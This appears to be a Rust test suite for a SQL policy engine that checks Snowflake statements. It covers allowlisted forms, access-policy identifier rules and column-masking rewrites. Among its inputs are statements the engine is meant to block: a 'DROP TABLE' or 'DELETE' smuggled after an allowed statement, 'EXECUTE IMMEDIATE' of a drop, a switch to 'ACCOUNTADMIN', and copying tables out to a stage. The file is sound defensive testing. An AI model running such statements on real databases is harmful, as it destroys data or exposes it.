    let ci = EnforcementPolicy {
        schema_migration_cap: Some(EnforcementAction::Flag),
        ..EnforcementPolicy::default()
    };
    let cases = [
        ("default", EnforcementPolicy::default(), Decision::Flag),
        ("monitor", monitor.clone(), Decision::Flag),
        ("ci cap", ci.clone(), Decision::Flag),
        (
            "mask tag",
            tagged(EnforcementPolicy::default()),
            Decision::Block,
        ),
        ("mask tag + monitor", tagged(monitor), Decision::Block),
        ("mask tag + ci cap", tagged(ci.clone()), Decision::Block),
        (
            "enforced allowlist",
            enforced_agent(EnforcementPolicy::default()),
            Decision::Block,
        ),
        (
            "enforced allowlist + ci cap",
            enforced_agent(ci),
            Decision::Block,
        ),
    ];
    for (label, policy, want) in cases {
        for sql in [
            UNPARSEABLE,
            "REMOVE @raw_stage/old/",
            "CREATE OR REPLACE ROLE developer",
        ] {
            assert_eq!(sf_with(sql, &policy).decision, want, "{label}: {sql}");
        }
    }
}

/// Unread code (a scripting block, EXECUTE IMMEDIATE, a pre-classified
/// statement) keeps the parse-error outcome as a floor under its findings.
#[test]
fn unread_code_keeps_the_parse_error_floor() {
    // No rule enabled at all: the parse-error outcome.
    for sql in [
        "EXECUTE IMMEDIATE 'DROP TABLE orders'",
        "BEGIN\n  SELECT 1;\nEND",
        "UNDROP TABLE orders",
        "CREATE TASK t WAREHOUSE = wh AS DELETE FROM orders",
    ] {
        let none = evaluate(sql, Dialect::Snowflake, &[], &EnforcementPolicy::default());
        assert_eq!(none.decision, Decision::Flag, "{sql}: {none:?}");
        assert!(is_parse_error(&none), "{sql}: {none:?}");
        // A protection lifts the floor to a block, whatever the rules say.
        let o = evaluate(
            sql,
            Dialect::Snowflake,
            &[],
            &tagged(EnforcementPolicy::default()),
        );
        assert_eq!(o.decision, Decision::Block, "{sql}: {o:?}");
        let o = evaluate(
            sql,
            Dialect::Snowflake,
            &[],
            &enforced_agent(EnforcementPolicy::default()),
        );
        assert_eq!(o.decision, Decision::Block, "{sql}: {o:?}");
    }
    // A blocking finding keeps the flat fields.
    let o = sf("UNDROP TABLE orders");
    assert_eq!(o.rule_code.as_deref(), Some("VERICTO-094"));
    assert_eq!(o.decision, Decision::Block);
    // A flagged finding under a protective tag: the floor blocks, and names
    // the finding.
    let flagged = vec![rule("VERICTO-094", Severity::Medium)];
    let o = evaluate(
        "UNDROP TABLE orders",
        Dialect::Snowflake,
        &flagged,
        &tagged(EnforcementPolicy::default()),
    );
    assert_eq!(o.decision, Decision::Block, "{o:?}");
    assert!(
        o.ast_node_path
            .as_deref()
            .unwrap_or_default()
            .contains("also reported: VERICTO-094"),
        "{o:?}"
    );
}

/// Statement kinds the engine does not analyse on Snowflake stay parse
/// errors: the classification in `parser::walk::not_analysed` is exhaustive.
#[test]
fn unmodelled_snowflake_statements_are_parse_errors() {
    for sql in [
        "REMOVE @raw_stage/old/",
        "CREATE OR REPLACE ROLE developer",
        UNPARSEABLE,
    ] {
        let o = sf(sql);
        assert!(is_parse_error(&o), "{sql}: {o:?}");
        assert_eq!(o.decision, Decision::Flag, "{sql}");
    }
}

// ---------------------------------------------------------------------------
// The allowlist of legitimate statements sqlparser 0.63 does not read
// ---------------------------------------------------------------------------

const ALLOWLISTED: &[&str] = &[
    "comment on table ANALYTICS.DBT_PROD.orders IS $$One row per order$$",
    "COMMENT ON COLUMN analytics.public.orders.status IS $$Order status$$",
    "COMMENT IF EXISTS ON VIEW v IS $$text with ; and DROP TABLE x inside$$",
    "alter view ANALYTICS.DBT_PROD.stg_orders set secure",
    "ALTER MATERIALIZED VIEW mv UNSET SECURE",
    "ALTER VIEW v SET COMMENT = 'reporting view'",
    "alter dynamic table ANALYTICS.DBT_PROD.orders_dt set target_lag = '2 hours' warehouse = TRANSFORMING_S",
    "ALTER DYNAMIC TABLE dt SET TARGET_LAG = DOWNSTREAM",
    "alter table ANALYTICS.DBT_PROD.orders alter \"STATUS\" comment $$Order status$$",
    "ALTER TABLE orders MODIFY COLUMN status UNSET COMMENT",
    "ALTER TABLE t1 ADD ROW ACCESS POLICY rap_t1 ON (empl_id)",
    "ALTER TABLE t ADD ROW ACCESS POLICY rap ON (cost, item)",
    "ALTER TABLE customers MODIFY COLUMN email SET MASKING POLICY email_mask",
    "ALTER TABLE customers ALTER COLUMN email SET MASKING POLICY m USING (email, region)",
    "ALTER TABLE t1 ADD COLUMN IF NOT EXISTS a2 NUMBER(38, 2)",
    "ALTER WAREHOUSE my_wh RESUME IF SUSPENDED",
    "ALTER WAREHOUSE IF EXISTS my_wh SUSPEND",
    "ALTER WAREHOUSE my_wh ABORT ALL QUERIES",
    "ALTER TASK mytask SUSPEND",
    "ALTER STAGE mystage REFRESH SUBPATH = 'data'",
    "DESC EXTERNAL TABLE exttable1",
    "DESCRIBE DYNAMIC TABLE analytics.public.orders_dt",
    "SHOW TERSE TABLES HISTORY IN ACCOUNT LIKE 'ORD%'",
    "UNSET my_variable",
    "UNSET (a, b)",
    "COPY INTO mytable FILE_FORMAT = (TYPE = 'CSV') PATTERN = '.*sales.*[.]csv' PURGE = TRUE",
    "COPY INTO mytable VALIDATION_MODE = 'RETURN_ERRORS'",
    "ALTER TABLE foo SET COMMENT = 'bar'",
    "ALTER TABLE foo SET CHANGE_TRACKING = FALSE",
    "ALTER TABLE foo ADD col1 VARCHAR(512), col2 VARCHAR(512)",
    "CREATE TABLE x (y INT AUTOINCREMENT START 10 NOORDER)",
    "CREATE TABLE t (a ARRAY(INT), c OBJECT(x INT), d MAP(VARCHAR, INT))",
    "CREATE SEQUENCE seq1 WITH START=1, INCREMENT=1 ORDER",
    "CREATE TAG cost_center ALLOWED_VALUES 'a', 'b'",
    "CREATE STAGE stage1 FILE_FORMAT = schema1.format1",
    "CREATE STAGE stage1 FILE_FORMAT = (FORMAT_NAME = stage1.format1)",
    "DESCRIBE TABLE analytics.public.orders TYPE = STAGE",
];

#[test]
fn allowlisted_statements_pass() {
    // Every entry here is text sqlparser 0.63 rejects: the allowlist is what
    // reads it.
    let parses: Vec<&&str> = ALLOWLISTED
        .iter()
        .filter(|sql| {
            sqlparser::parser::Parser::parse_sql(&sqlparser::dialect::SnowflakeDialect {}, sql)
                .is_ok()
        })
        .collect();
    assert!(
        parses.is_empty(),
        "parsed by sqlparser, not allowlist cases: {parses:?}"
    );
    for sql in ALLOWLISTED {
        let o = sf(sql);
        assert_eq!(o.decision, Decision::Allow, "{sql}: {o:?}");
        assert!(o.violations.is_empty(), "{sql}: {o:?}");
        // No parse-error finding, even with a tag: they read no column.
        let o = sf_with(sql, &tagged(EnforcementPolicy::default()));
        assert_eq!(o.decision, Decision::Allow, "{sql}: {o:?}");
        // Still DDL to an agent allowlist.
        let o = sf_with(sql, &enforced_agent(EnforcementPolicy::default()));
        assert_eq!(o.decision, Decision::Block, "{sql}: {o:?}");
    }
}

/// Near misses: a variant that adds anything to an allowlisted form (a body
/// that could hold a statement, another option, a second statement) is not
/// on the allowlist. It is a parse error (flagged), or a finding.
#[test]
fn near_misses_are_not_allowlisted() {
    let flagged: &[&str] = &[
        // A $$ body somewhere other than a comment value.
        "ALTER VIEW v SET COMMENT = $$x$$",
        "ALTER TABLE t ALTER c COMMENT $$x$$ SET DATA TYPE NUMBER",
        // A second statement.
        "COMMENT ON TABLE t IS 'x'; DROP TABLE t",
        "ALTER VIEW v SET SECURE; DELETE FROM orders",
        // Other options than the allowlisted ones.
        "ALTER VIEW v SET SECURE RECURSIVE",
        "ALTER DYNAMIC TABLE dt SET TARGET_LAG = '1 hour' REFRESH_MODE = FULL",
        "ALTER TABLE customers MODIFY COLUMN email SET MASKING POLICY m FORCE",
        "ALTER TABLE t1 ADD COLUMN IF NOT EXISTS a2 NUMBER AS (a1 * 2)",
        "ALTER TABLE t1 ADD COLUMN IF NOT EXISTS a2 NUMBER DEFAULT 0",
        "ALTER STAGE s RENAME TO s2",
        "ALTER TASK t SET SCHEDULE = '1 MINUTE'",
        "DESC USER jessicajones",
        "SHOW TABLES IN (SELECT 1)",
        "COMMENT ON TABLE t IS 'x' extra",
        "COPY INTO @stage FILE_FORMAT = (TYPE = CSV)",
        "COPY INTO mytable FILES = (SELECT 1)",
        "CREATE OR REPLACE SEQUENCE seq1 START = 1",
        "CREATE TABLE x (y INT AUTOINCREMENT START 10 DEFAULT 0)",
        "CREATE TABLE x (y INT AUTOINCREMENT START 10) COPY GRANTS",
        "CREATE STAGE s FILE_FORMAT = f STORAGE_INTEGRATION = si",
        "ALTER TABLE t SET DATA_RETENTION_TIME_IN_DAYS = 1",
        "ALTER TABLE t SET TAG cost_center = 'x'",
        "ALTER TABLE t UNSET TAG cost_center",
        "ALTER TABLE foo ADD col1 VARCHAR NOT NULL TAG (k = 'v'), col2 VARCHAR NOT NULL TAG (k = 'w')",
        "DESCRIBE TABLE t TYPE = STAGE EXTRA",
    ];
    for sql in flagged {
        let o = sf(sql);
        assert_ne!(
            o.decision,
            Decision::Allow,
            "{sql} must not be allowlisted: {o:?}"
        );
        assert!(
            o.violations.is_empty() || o.decision == Decision::Block,
            "{sql}: {o:?}"
        );
    }
    // A dangerous neighbour of an allowlisted form keeps its finding.
    for (sql, code) in [
        ("ALTER TASK t RESUME", "VERICTO-096"),
        (
            "ALTER WAREHOUSE wh SET WAREHOUSE_SIZE = 'X6LARGE'",
            "VERICTO-095",
        ),
        ("ALTER STAGE s SET URL = 's3://other/'", "VERICTO-092"),
        ("ALTER TABLE t DROP ROW ACCESS POLICY rap", "VERICTO-019"),
        (
            "ALTER TABLE t SET DATA_RETENTION_TIME_IN_DAYS = 0",
            "VERICTO-094",
        ),
    ] {
        assert_eq!(sf(sql).rule_code.as_deref(), Some(code), "{sql}");
    }
}

// ---------------------------------------------------------------------------
// VERICTO-087 identifier semantics (design §4.4)
// ---------------------------------------------------------------------------

fn agent(json: &str) -> EnforcementPolicy {
    EnforcementPolicy {
        access_policy: Some(serde_json::from_str::<AccessPolicy>(json).unwrap()),
        ..EnforcementPolicy::default()
    }
}

fn access(sql: &str, policy: &EnforcementPolicy) -> EvaluationOutcome {
    evaluate(sql, Dialect::Snowflake, &[], policy)
}

fn allowed(sql: &str, policy: &EnforcementPolicy) -> bool {
    let o = access(sql, policy);
    o.decision == Decision::Allow && o.access_denied.is_empty()
}

const ANALYST: &str = r#"{"mode":"enforce","default_database":"ANALYTICS","default_schema":"PUBLIC","entries":[
    {"table":"orders","columns":"*"},
    {"schema":"sales","table":"customers","columns":["id","name"]},
    {"table":"\"MixedCase\"","columns":"*"},
    {"database":"raw","schema":"events","table":"clicks","columns":"*"},
    {"table":"@export_stage","columns":"*"}
]}"#;

#[test]
fn vericto_087_unquoted_names_fold_to_upper_case() {
    let p = agent(ANALYST);
    for sql in [
        "SELECT * FROM orders",
        "SELECT * FROM ORDERS",
        "SELECT * FROM Orders",
        "SELECT * FROM \"ORDERS\"",
        "SELECT id, name FROM sales.customers",
        "SELECT ID, Name FROM SALES.CUSTOMERS",
    ] {
        assert!(allowed(sql, &p), "{sql}: {:?}", access(sql, &p));
    }
    // A quoted lower-case name is another table.
    let o = access("SELECT * FROM \"orders\"", &p);
    assert_eq!(o.decision, Decision::Block);
    assert_eq!(o.access_denied[0].table, "orders");
    // A column outside the entry.
    let o = access("SELECT email FROM sales.customers", &p);
    assert_eq!(o.decision, Decision::Block);
    assert_eq!(o.access_denied[0].column.as_deref(), Some("EMAIL"));
}

#[test]
fn vericto_087_quoted_names_are_case_sensitive() {
    let p = agent(ANALYST);
    assert!(allowed("SELECT * FROM \"MixedCase\"", &p));
    for sql in ["SELECT * FROM mixedcase", "SELECT * FROM \"MIXEDCASE\""] {
        assert_eq!(access(sql, &p).decision, Decision::Block, "{sql}");
    }
}

#[test]
fn vericto_087_quoted_identifiers_ignore_case() {
    let entries =
        r#""entries":[{"table":"orders","columns":"*"},{"table":"\"Exact\"","columns":"*"}]"#;
    let on = agent(&format!(
        r#"{{"mode":"enforce","quoted_identifiers_ignore_case":true,{entries}}}"#
    ));
    let off = agent(&format!(
        r#"{{"mode":"enforce","quoted_identifiers_ignore_case":false,{entries}}}"#
    ));
    let unknown = agent(&format!(r#"{{"mode":"enforce",{entries}}}"#));
    // TRUE: quoted names fold too.
    assert!(allowed("SELECT * FROM \"orders\"", &on));
    assert!(allowed("SELECT * FROM \"EXACT\"", &on));
    assert!(allowed("SELECT * FROM exact", &on));
    // FALSE (Snowflake's default): exact.
    assert_eq!(
        access("SELECT * FROM \"orders\"", &off).decision,
        Decision::Block
    );
    assert!(allowed("SELECT * FROM \"Exact\"", &off));
    // Unknown: both readings; denied when they differ.
    assert_eq!(
        access("SELECT * FROM \"orders\"", &unknown).decision,
        Decision::Block
    );
    assert_eq!(
        access("SELECT * FROM \"EXACT\"", &unknown).decision,
        Decision::Block
    );
    // Both readings allow the exact spelling.
    assert!(allowed("SELECT * FROM \"Exact\"", &unknown));
    // Unquoted names read the same either way.
    assert!(allowed("SELECT * FROM orders", &unknown));
}

#[test]
fn vericto_087_three_part_names_resolve_with_host_defaults() {
    let p = agent(ANALYST);
    for sql in [
        "SELECT * FROM analytics.public.orders",
        "SELECT * FROM public.orders",
        "SELECT * FROM raw.events.clicks",
        "SELECT o.id FROM analytics.public.orders o",
        "SELECT public.orders.id FROM analytics.public.orders",
    ] {
        assert!(allowed(sql, &p), "{sql}: {:?}", access(sql, &p));
    }
    // Another database, or the entry's database without naming it.
    let o = access("SELECT * FROM other.public.orders", &p);
    assert_eq!(o.decision, Decision::Block);
    assert_eq!(o.access_denied[0].schema.as_deref(), Some("OTHER.PUBLIC"));
    assert_eq!(
        access("SELECT * FROM events.clicks", &p).decision,
        Decision::Block
    );
    // Without a host database, a schema-less, database-less entry matches
    // only names without a database.
    let no_db = agent(r#"{"mode":"enforce","entries":[{"table":"orders","columns":"*"}]}"#);
    assert!(allowed("SELECT * FROM orders", &no_db));
    assert_eq!(
        access("SELECT * FROM analytics.public.orders", &no_db).decision,
        Decision::Block
    );
}

#[test]
fn vericto_087_catalogue_stages_and_dynamic_names() {
    let p = agent(ANALYST);
    // The catalogue: INFORMATION_SCHEMA and the shared SNOWFLAKE database.
    for sql in [
        "SELECT * FROM information_schema.tables",
        "SELECT * FROM analytics.information_schema.columns",
        "SELECT * FROM snowflake.account_usage.query_history",
        "SHOW TABLES",
    ] {
        assert_eq!(access(sql, &p).decision, Decision::Block, "{sql}");
    }
    let catalogue = agent(
        r#"{"mode":"enforce","entries":[{"database":"snowflake","schema":"account_usage","table":"query_history","columns":"*"}]}"#,
    );
    assert!(allowed(
        "SELECT * FROM snowflake.account_usage.query_history",
        &catalogue
    ));
    // Stages are data: they need an entry.
    assert!(allowed("SELECT $1 FROM @export_stage/part.csv", &p));
    assert_eq!(
        access("SELECT $1 FROM @other_stage", &p).decision,
        Decision::Block
    );
    // Dynamic names and table functions that may read anything.
    for sql in [
        "SELECT * FROM IDENTIFIER('orders')",
        "SELECT * FROM IDENTIFIER($t)",
        "SELECT * FROM TABLE($t)",
        "SELECT * FROM TABLE(RESULT_SCAN(LAST_QUERY_ID()))",
        "SELECT * FROM TABLE(INFORMATION_SCHEMA.QUERY_HISTORY())",
    ] {
        assert_eq!(access(sql, &p).decision, Decision::Block, "{sql}");
    }
    // FLATTEN computes rows from its argument only.
    assert!(allowed(
        "SELECT f.value FROM orders o, LATERAL FLATTEN(input => o.items) f",
        &p
    ));
}

#[test]
fn vericto_087_denies_snowflake_statements_outright() {
    let p = agent(ANALYST);
    for sql in [
        "USE DATABASE raw",
        "USE ROLE ACCOUNTADMIN",
        "ALTER SESSION SET QUOTED_IDENTIFIERS_IGNORE_CASE = TRUE",
        "COPY INTO @export_stage FROM orders",
        "COPY INTO orders FROM @export_stage",
        "PUT 'file:///tmp/x' @export_stage",
        "CREATE STAGE s",
        "BEGIN\n  SELECT 1;\nEND",
        "EXECUTE IMMEDIATE 'SELECT 1'",
        "UNDROP TABLE orders",
    ] {
        let o = access(sql, &p);
        assert_eq!(o.decision, Decision::Block, "{sql}: {o:?}");
    }
    // Session formatting is allowed.
    assert!(allowed(
        "ALTER SESSION SET QUERY_TAG = 'agent' TIMEZONE = 'UTC'",
        &p
    ));
}

/// An entry written for Snowflake is ignored by the other dialects' fields:
/// the new fields default to none and do not serialize when unset.
#[test]
fn vericto_087_new_fields_are_optional() {
    let p: AccessPolicy =
        serde_json::from_str(r#"{"entries":[{"table":"orders","columns":"*"}]}"#).unwrap();
    assert_eq!(p.default_database, None);
    assert_eq!(p.quoted_identifiers_ignore_case, None);
    assert_eq!(p.entries[0].database, None);
    let json = serde_json::to_string(&p).unwrap();
    assert!(!json.contains("database"), "{json}");
    assert!(!json.contains("quoted_identifiers"), "{json}");
    let alias: AccessPolicy = serde_json::from_str(
        r#"{"entries":[{"database_name":"raw","table":"clicks","columns":"*"}]}"#,
    )
    .unwrap();
    assert_eq!(alias.entries[0].database.as_deref(), Some("raw"));
}

// ---------------------------------------------------------------------------
// VERICTO-085 mask rewrite (design §4.5): golden outputs
// ---------------------------------------------------------------------------

fn masked(tags: &str) -> EnforcementPolicy {
    EnforcementPolicy {
        sensitive_columns: serde_json::from_str::<Vec<SensitiveColumn>>(tags).unwrap(),
        ..EnforcementPolicy::default()
    }
}

const TAGS: &str = r#"[
    {"table":"customers","column":"email","policy":"mask","mask_style":"email"},
    {"table":"customers","column":"card","policy":"mask","mask_style":"last4"},
    {"table":"customers","column":"ssn","policy":"mask","mask_style":"hash"},
    {"table":"customers","column":"note","policy":"mask","mask_style":"full"},
    {"table":"raw_events","column":"v","policy":"mask","mask_style":"email"}
]"#;

const EMAIL_MASK: &str = "CASE WHEN LENGTH(TO_VARCHAR(email)) = 0 THEN TO_VARCHAR(email) WHEN CHARINDEX('@', TO_VARCHAR(email), 2) > 0 THEN CONCAT(LEFT(TO_VARCHAR(email), 1), '***', SUBSTR(TO_VARCHAR(email), CHARINDEX('@', TO_VARCHAR(email), 2))) ELSE CONCAT(LEFT(TO_VARCHAR(email), 1), '***') END";

fn rewrite(sql: &str) -> Option<String> {
    let o = evaluate(sql, Dialect::Snowflake, &[], &masked(TAGS));
    if o.rewritten_query.is_some() {
        assert_eq!(o.decision, Decision::Flag, "{o:?}");
        assert_eq!(o.rule_code.as_deref(), Some("VERICTO-085"));
    }
    o.rewritten_query
}

fn refused(sql: &str) -> String {
    let o = evaluate(sql, Dialect::Snowflake, &[], &masked(TAGS));
    assert_eq!(o.decision, Decision::Block, "{sql}: {o:?}");
    assert_eq!(o.rewritten_query, None);
    o.ast_node_path.unwrap_or_default()
}

#[test]
fn vericto_085_snowflake_golden_rewrites() {
    let golden: &[(&str, String)] = &[
        (
            "SELECT id, email FROM customers",
            format!("SELECT id, {EMAIL_MASK} AS email FROM customers"),
        ),
        (
            "SELECT card, ssn, note FROM customers WHERE id = ?",
            "SELECT CASE WHEN LENGTH(TO_VARCHAR(card)) <= 8 THEN '[redacted]' ELSE CONCAT('****', RIGHT(TO_VARCHAR(card), 4)) END AS card, SHA2(TO_VARCHAR(ssn), 256) AS ssn, '[redacted]' AS note FROM customers WHERE id = ?".to_string(),
        ),
        // The client's alias, and a quoted name, are kept as written.
        (
            "SELECT email AS contact FROM customers",
            format!("SELECT {EMAIL_MASK} AS contact FROM customers"),
        ),
        (
            "SELECT \"NOTE\" FROM customers",
            "SELECT '[redacted]' AS \"NOTE\" FROM customers".to_string(),
        ),
        // A qualified column keeps its own name.
        (
            "SELECT c.note FROM customers c WHERE c.id = :1",
            "SELECT '[redacted]' AS note FROM customers c WHERE c.id = :1".to_string(),
        ),
        // A computed value, or one holding a bind parameter, is redacted in
        // place: `?` stays where it was.
        (
            "SELECT LOWER(note) AS n FROM customers",
            "SELECT CONCAT('[redacted]', COALESCE(LEFT(TO_VARCHAR(LOWER(note)), 0), '')) AS n FROM customers".to_string(),
        ),
        (
            "SELECT CONCAT(email, ?) AS e FROM customers WHERE id = ?",
            "SELECT CONCAT('[redacted]', COALESCE(LEFT(TO_VARCHAR(CONCAT(email, ?)), 0), '')) AS e FROM customers WHERE id = ?".to_string(),
        ),
        // A VARIANT path masks the whole projected value; FLATTEN output
        // derived from a masked column is masked `full`.
        (
            "SELECT v:email::string AS e FROM raw_events",
            "SELECT CONCAT('[redacted]', COALESCE(LEFT(TO_VARCHAR(v:email::STRING), 0), '')) AS e FROM raw_events".to_string(),
        ),
        (
            "SELECT f.value AS item FROM raw_events r, LATERAL FLATTEN(input => r.v) f",
            "SELECT '[redacted]' AS item FROM raw_events r, LATERAL FLATTEN(input => r.v) f".to_string(),
        ),
        // Spellings Snowflake reads alike (`!=`, keyword case, comments).
        (
            "select id, note from customers where id != 1 -- trailing",
            "SELECT id, '[redacted]' AS note FROM customers WHERE id <> 1".to_string(),
        ),
    ];
    for (sql, want) in golden {
        assert_eq!(rewrite(sql).as_deref(), Some(want.as_str()), "{sql}");
    }
}

#[test]
fn vericto_085_snowflake_refuses_what_it_cannot_rewrite() {
    for (sql, why) in [
        ("SELECT LOWER(email) FROM customers", "alias it"),
        ("SELECT note FROM customers ORDER BY note", "ORDER BY"),
        ("SELECT note FROM customers ORDER BY 1", "ORDER BY"),
        (
            "SELECT id, note FROM customers QUALIFY ROW_NUMBER() OVER (PARTITION BY note ORDER BY id) = 1",
            "QUALIFY",
        ),
        (
            "SELECT note, COUNT(*) AS n FROM customers GROUP BY note",
            "GROUP BY",
        ),
        ("SELECT * FROM customers", "list the columns"),
        ("INSERT INTO copy SELECT note FROM customers", "copied"),
    ] {
        let path = refused(sql);
        assert!(path.contains(why), "{sql}: {path}");
    }
}

// Fixed in 4.1.3 (finding F4 of the 0031 tests): `snowflake_order_refusal`
// refuses `ORDER BY ALL` over masked outputs (Snowflake would sort by the
// masked values, so the rewrite changes the result order), but sqlparser
// 0.63's Snowflake dialect does not read `ORDER BY ALL`: it parsed `ALL` as a
// column, the refusal never ran, and the rewrite was forwarded with
// `ORDER BY ALL` intact. `parser::resolve_snowflake_order_by_all` now reads a
// bare `ALL` as `OrderByKind::All` (until sqlparser does, upstream #2502).
// These cases stay as the regression check for that upgrade.
#[test]
fn vericto_085_snowflake_refuses_order_by_all() {
    for sql in [
        "SELECT note FROM customers ORDER BY ALL",
        "SELECT id, note FROM customers ORDER BY all",
        "SELECT id, email FROM customers ORDER BY All DESC NULLS LAST",
        "SELECT note FROM customers WHERE id > 1 ORDER BY ALL LIMIT 10",
    ] {
        let path = refused(sql);
        assert!(path.contains("ORDER BY ALL"), "{sql}: {path}");
        // Same reason style as `ORDER BY note` / `ORDER BY 1`.
        assert!(
            path.contains("would order by the masked value"),
            "{sql}: {path}"
        );
    }
    // A quoted "ALL" is a real column, and so is `all_col`: the rewrite
    // keeps them as written.
    assert_eq!(
        rewrite("SELECT note FROM customers ORDER BY \"ALL\"").as_deref(),
        Some("SELECT '[redacted]' AS note FROM customers ORDER BY \"ALL\""),
    );
    assert_eq!(
        rewrite("SELECT note FROM customers ORDER BY all_col").as_deref(),
        Some("SELECT '[redacted]' AS note FROM customers ORDER BY all_col"),
    );
    // A derived table's `ORDER BY ALL` is not the client's order; the outer
    // rewrite parses back with it (the re-parse reads `ALL` the same way).
    assert_eq!(
        rewrite("SELECT t.note FROM (SELECT id, note FROM customers ORDER BY ALL) AS t").as_deref(),
        Some("SELECT '[redacted]' AS note FROM (SELECT id, note FROM customers ORDER BY ALL) AS t"),
    );
    // No masked output: nothing to rewrite or refuse.
    let o = evaluate(
        "SELECT id FROM customers ORDER BY ALL",
        Dialect::Snowflake,
        &[],
        &masked(TAGS),
    );
    assert_eq!(o.decision, Decision::Allow, "{o:?}");
    assert_eq!(o.rewritten_query, None);
}

/// The rewrite is parsed back and must be the rewritten tree.
#[test]
fn vericto_085_snowflake_rewrite_reparses() {
    use sqlparser::dialect::SnowflakeDialect;
    for sql in [
        "SELECT id, email, card, ssn, note FROM customers WHERE id = ?",
        "SELECT v:email::string AS e FROM raw_events WHERE id = :1",
    ] {
        let out = rewrite(sql).unwrap();
        sqlparser::parser::Parser::parse_sql(&SnowflakeDialect {}, &out)
            .unwrap_or_else(|e| panic!("{out}: {e}"));
    }
}
